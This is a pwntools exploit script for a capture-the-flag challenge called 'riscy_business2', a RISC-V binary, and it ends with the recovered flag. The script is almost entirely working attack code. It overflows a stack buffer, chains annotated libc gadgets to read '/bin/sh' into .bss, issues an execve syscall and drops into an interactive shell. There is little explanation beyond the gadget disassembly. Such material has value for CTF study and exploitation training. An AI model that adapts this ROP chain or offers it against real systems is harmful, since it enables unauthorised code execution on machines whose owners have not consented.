from pwn import *

context.arch = 'riscv64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./riscy_business2', '''
    b *0x1067a
    continue
''')

# p = remote('challs.crate.nu', 40002)

"""
_Unwind_FindEnclosingFunction:
0005cbae  6265       ld      a0, 0x18(sp)
0005cbb0  a270       ld      ra, 0x28(sp)
0005cbb2  4561       addi    sp, sp, 0x30
0005cbb4  8280       ret
"""
gadget_1 = 0x5cbae
"""
_dl_runtime_resolve:
000531c6  2a83       mv      t1, a0
000531c8  a660       ld      ra, 0x48(sp)
000531ca  2265       ld      a0, 0x8(sp)
000531cc  c265       ld      a1, 0x10(sp)
000531ce  6266       ld      a2, 0x18(sp)
000531d0  8276       ld      a3, 0x20(sp)
000531d2  2277       ld      a4, 0x28(sp)
000531d4  c277       ld      a5, 0x30(sp)
000531d6  6278       ld      a6, 0x38(sp)
000531d8  8668       ld      a7, 0x40(sp)
000531da  4625       fld     fa0, 0x50(sp)
000531dc  e625       fld     fa1, 0x58(sp)
000531de  0636       fld     fa2, 0x60(sp)
000531e0  a636       fld     fa3, 0x68(sp)
000531e2  4637       fld     fa4, 0x70(sp)
000531e4  e637       fld     fa5, 0x78(sp)
000531e6  0a28       fld     fa6, 0x80(sp)
000531e8  aa28       fld     fa7, 0x88(sp)
000531ea  4961       addi    sp, sp, 0x90
000531ec  0283       jr      t1
"""
gadget_2 = 0x531c6
"""
__getpid():
0002b7b0  73000000   ecall
0002b7b4  8280       ret
"""
gadget_3 = 0x2b7b0

libc_read = 0x2be60
bss_binsh = 0x86000
syscall_execve = 0xdd

payload = b'A'*0x108+p64(gadget_1)
payload += b'\x00'*0x18+p64(libc_read)+b'\x00'*0x8+p64(gadget_2)+b'\x00'*0x8+p64(0)+p64(bss_binsh)+p64(8)+b'\x00'*0x28+p64(gadget_1)+b'\x00'*0x40
payload += b'\x00'*0x18+p64(gadget_3)+b'\x00'*0x8+p64(gadget_2)+b'\x00'*0x8+p64(bss_binsh)+p64(0)+p64(0)+b'\x00'*0x20+p64(syscall_execve)+p64(gadget_1)+b'\x00'*0x40
p.sendlineafter(b"> ", payload)

p.send(b'/bin/sh\x00')

p.interactive()

# cratectf{ojojoj_funktionsepiloger_är_ju_sig_lika}